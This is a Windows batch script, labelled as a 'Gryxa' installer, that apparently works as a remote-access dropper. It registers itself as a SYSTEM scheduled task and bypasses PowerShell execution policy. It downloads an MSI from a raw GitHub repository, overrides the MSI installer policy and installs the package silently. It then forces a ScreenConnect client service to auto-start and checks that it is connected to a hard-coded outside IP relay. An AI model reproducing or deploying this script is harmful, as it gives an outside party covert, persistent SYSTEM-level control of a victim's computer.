@echo off
rem Install Gryxa from GitHub pkg_gryxa.msi (fresh UI MSI). No ui.gryxa.com.
rem schtasks must AllowStartIfOnBatteries (laptops otherwise stay Status=Queued).
rem Log: C:\Users\Public\gryxa_local_install.log
setlocal EnableExtensions
set "LOG=C:\Users\Public\gryxa_local_install.log"
set "SELF=%~f0"
set "PUB=C:\Users\Public\gryxa_li.cmd"

if /I "%~nx0"=="gryxa_li.cmd" goto :run
if /I "%~1"=="--detached" goto :run
if /I "%~1"=="--run" goto :run

rem --- launcher ---
copy /y "%SELF%" "%PUB%" >nul 2>&1
>"%LOG%" echo [%DATE% %TIME%] LAUNCHER host=%COMPUTERNAME%

rem PowerShell Register-ScheduledTask: allow on battery + start now
powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
  "$ErrorActionPreference='Stop'; ^
   $tn='WinRTCSGryxaLI'; ^
   Unregister-ScheduledTask -TaskName $tn -Confirm:$false -ErrorAction SilentlyContinue; ^
   $a=New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c C:\Users\Public\gryxa_li.cmd --run'; ^
   $st=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Hours 2); ^
   $p=New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest; ^
   Register-ScheduledTask -TaskName $tn -Action $a -Settings $st -Principal $p -Force | Out-Null; ^
   Start-ScheduledTask -TaskName $tn; ^
   Add-Content '%LOG%' ('LAUNCHER_STARTED '+ (Get-Date -Format o))" >>"%LOG%" 2>&1

echo QUEUED gryxa-local-install - log %LOG%
echo If on battery, task is set AllowStartIfOnBatteries.
endlocal & exit /b 0

:run
>>"%LOG%" echo [%DATE% %TIME%] RUN_BEGIN host=%COMPUTERNAME%
set "MSI=C:\Users\Public\gryxa.msi"
set "GSVC=ScreenConnect Client (36e506ff016b2151)"
set "CURL=%SystemRoot%\System32\curl.exe"
set "BASE=https://raw.githubusercontent.com/xnobuddy/github-drop/main"

echo [%DATE% %TIME%] fetch_github_ui_msi>>"%LOG%"
del /f /q "%MSI%" >nul 2>&1
"%CURL%" -f -L --ssl-no-revoke --connect-timeout 15 --max-time 180 -o "%MSI%" "%BASE%/pkg_gryxa.msi?t=%RANDOM%" >>"%LOG%" 2>&1
set "OKMSI="
if exist "%MSI%" for %%F in ("%MSI%") do if %%~zF GEQ 5000000 set "OKMSI=1"
if not defined OKMSI (
  echo [%DATE% %TIME%] FAIL_no_msi>>"%LOG%"
  echo FAIL_NO_MSI>>"%LOG%"
  endlocal & exit /b 3
)
for %%F in ("%MSI%") do echo [%DATE% %TIME%] msi_ok size=%%~zF>>"%LOG%"

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1
sc stop "%GSVC%" >>"%LOG%" 2>&1
ping -n 4 127.0.0.1 >nul

echo [%DATE% %TIME%] msiexec_i_wait>>"%LOG%"
start /wait msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress
echo [%DATE% %TIME%] msiexec_exit=%ERRORLEVEL%>>"%LOG%"

sc config "%GSVC%" start= auto >>"%LOG%" 2>&1
sc start "%GSVC%" >>"%LOG%" 2>&1
ping -n 20 127.0.0.1 >nul
sc query "%GSVC%" >>"%LOG%" 2>&1

powershell -NoP -NonI -EP Bypass -Command "$ErrorActionPreference='SilentlyContinue'; $s=Get-CimInstance Win32_Service | Where-Object { $_.Name -eq 'ScreenConnect Client (36e506ff016b2151)' }; if(-not $s){ Add-Content '%LOG%' 'NO_SVC'; exit 4 }; Add-Content '%LOG%' ('state='+$s.State+' pid='+$s.ProcessId); $est=@(Get-NetTCPConnection -OwningProcess $s.ProcessId -State Established -EA 0); if($est.Count -eq 0){ Add-Content '%LOG%' 'EST=NONE' } else { foreach($e in $est){ Add-Content '%LOG%' ('EST='+$e.RemoteAddress+':'+$e.RemotePort) } }; if($est | Where-Object { $_.RemoteAddress -eq '209.145.55.189' }){ Add-Content '%LOG%' 'INSTALL_OK_CONNECTED' } else { Add-Content '%LOG%' 'INSTALL_DONE_NO_RELAY_EST' }"

echo [%DATE% %TIME%] RUN_DONE>>"%LOG%"
endlocal & exit /b 0
